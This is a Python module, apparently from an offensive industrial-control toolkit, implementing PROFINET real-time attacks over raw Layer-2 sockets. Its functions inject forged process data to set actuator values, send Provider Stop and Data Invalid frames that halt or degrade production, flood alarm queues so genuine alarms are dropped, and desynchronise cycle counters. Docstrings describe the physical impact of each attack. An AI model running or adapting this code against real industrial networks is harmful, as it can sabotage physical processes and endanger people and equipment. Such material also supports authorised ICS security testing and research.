"""
PROFINET RT (Real-Time) attack modules — inject, manipulate, and disrupt process data.
All attacks operate on Layer 2 with EtherType 0x8892.
"""
import struct
import time
import random
from typing import List, Optional
from dataclasses import dataclass

from ..protocols.profinet_rt import (
    RTFrame, AlarmFrame, RTCycleGenerator,
    build_rt_frame, build_alarm_frame,
    build_process_data_injection, build_provider_stop, build_data_invalid,
    DataStatus,
)
from ..protocols.profinet_dcp import build_ethernet_frame, PROFINET_ETHER_TYPE
from .dcp_attacks import AttackResult


class RTAttacks:
    """RT-layer attacks targeting PROFINET real-time process data."""

    def __init__(self, interface: str = "eth0", src_mac: bytes = b"\x00\x11\x22\x33\x44\x55"):
        self.interface = interface
        self.src_mac = src_mac
        self._sock = None

    def _get_socket(self):
        if self._sock is None:
            import socket
            import sys
            if sys.platform == "win32":
                raise OSError("Use Scapy mode on Windows")
            self._sock = socket.socket(
                socket.AF_PACKET, socket.SOCK_RAW, socket.htons(PROFINET_ETHER_TYPE)
            )
            self._sock.bind((self.interface, 0))
        return self._sock

    def _send(self, dst_mac: bytes, payload: bytes):
        frame = build_ethernet_frame(dst_mac, self.src_mac, payload)
        self._get_socket().send(frame)

    def process_data_injection(self, target_mac: str, frame_id: int,
                                data: bytes, count: int = 100,
                                interval_ms: float = 1.0) -> AttackResult:
        """
        Inject crafted RT process data frames.

        Impact: Directly manipulates sensor/actuator values seen by the IO-Controller.
        Can set motor speeds, valve positions, temperature readings to arbitrary values.
        The IO-Controller accepts the frames if Frame ID and timing match.
        """
        start = time.time()
        target_bytes = bytes(int(b, 16) for b in target_mac.split(":"))
        gen = RTCycleGenerator(frame_id, data, interval_ms)

        for _ in range(count):
            rt_payload = gen.next_frame()
            self._send(target_bytes, rt_payload)

        return AttackResult(
            attack="RT Process Data Injection",
            target=target_mac,
            success=True,
            detail=f"Injected {count} RT frames to FrameID 0x{frame_id:04X} "
                   f"with {len(data)} bytes of crafted process data",
            packets_sent=count,
            duration=time.time() - start,
        )

    def provider_stop_injection(self, target_mac: str, frame_id: int,
                                 count: int = 50) -> AttackResult:
        """
        Inject RT frames with Provider Stop status.

        Impact: Tells the IO-Controller that the IO-Device has stopped providing data.
        Controller transitions to substitute values or enters safe state.
        In a production line, this stops the associated process.
        """
        start = time.time()
        target_bytes = bytes(int(b, 16) for b in target_mac.split(":"))

        for _ in range(count):
            payload = build_provider_stop(frame_id)
            self._send(target_bytes, payload)
            time.sleep(0.001)

        return AttackResult(
            attack="RT Provider Stop Injection",
            target=target_mac,
            success=True,
            detail=f"Injected {count} Provider-Stop frames for FrameID 0x{frame_id:04X} "
                   f"— IO-Controller will enter safe state",
            packets_sent=count,
            duration=time.time() - start,
        )

    def data_invalid_injection(self, target_mac: str, frame_id: int,
                                count: int = 50) -> AttackResult:
        """
        Inject RT frames with Data Invalid status.

        Impact: Consumer (IO-Controller) uses substitute values instead of live process data.
        More subtle than Provider Stop — the connection stays up but operates on stale/default data.
        """
        start = time.time()
        target_bytes = bytes(int(b, 16) for b in target_mac.split(":"))

        for _ in range(count):
            payload = build_data_invalid(frame_id)
            self._send(target_bytes, payload)
            time.sleep(0.001)

        return AttackResult(
            attack="RT Data Invalid Injection",
            target=target_mac,
            success=True,
            detail=f"Injected {count} Data-Invalid frames — controller uses substitute values",
            packets_sent=count,
            duration=time.time() - start,
        )

    def alarm_flood(self, target_mac: str, count: int = 500) -> AttackResult:
        """
        Flood target with PROFINET alarm frames.

        Impact: PROFINET has limited alarm processing capacity (typically 1-4 concurrent alarms).
        Flooding exhausts the alarm queue, causing legitimate alarms to be dropped.
        Can also trigger watchdog timeouts on resource-constrained devices.
        """
        start = time.time()
        target_bytes = bytes(int(b, 16) for b in target_mac.split(":"))

        for i in range(count):
            alarm = AlarmFrame(
                alarm_type=random.choice([1, 2]),
                api=0,
                slot_number=random.randint(0, 0xFFFF),
                subslot_number=random.randint(0, 0xFFFF),
                module_ident=random.randint(0, 0xFFFFFFFF),
                submodule_ident=random.randint(0, 0xFFFFFFFF),
                alarm_specifier=random.randint(0, 0xFFFF),
                alarm_data=bytes(random.randint(0, 255) for _ in range(random.randint(4, 64))),
            )
            payload = build_alarm_frame(alarm)
            self._send(target_bytes, payload)
            time.sleep(0.0005)

        return AttackResult(
            attack="Alarm Flood",
            target=target_mac,
            success=True,
            detail=f"Sent {count} alarm frames — alarm queue exhaustion, "
                   f"legitimate alarms may be dropped",
            packets_sent=count,
            duration=time.time() - start,
        )

    def cycle_counter_desync(self, target_mac: str, frame_id: int,
                              count: int = 200) -> AttackResult:
        """
        Inject RT frames with intentionally wrong cycle counters.

        Impact: Some PROFINET implementations use the cycle counter for
        frame ordering and duplicate detection. Injecting frames with
        future cycle counter values can cause the legitimate frames to
        be rejected as duplicates or out-of-order.
        """
        start = time.time()
        target_bytes = bytes(int(b, 16) for b in target_mac.split(":"))

        for i in range(count):
            # Use high cycle counter values to "get ahead" of the legitimate sender
            rt = RTFrame(
                frame_id=frame_id,
                io_data=b"\x00" * 40,
                cycle_counter=0xFFF0 + (i % 16),
                data_status=DataStatus.normal_running(),
                transfer_status=0x00,
            )
            payload = build_rt_frame(rt)
            self._send(target_bytes, payload)
            time.sleep(0.001)

        return AttackResult(
            attack="RT Cycle Counter Desync",
            target=target_mac,
            success=True,
            detail=f"Injected {count} frames with future cycle counters "
                   f"— legitimate frames may be rejected as duplicates",
            packets_sent=count,
            duration=time.time() - start,
        )
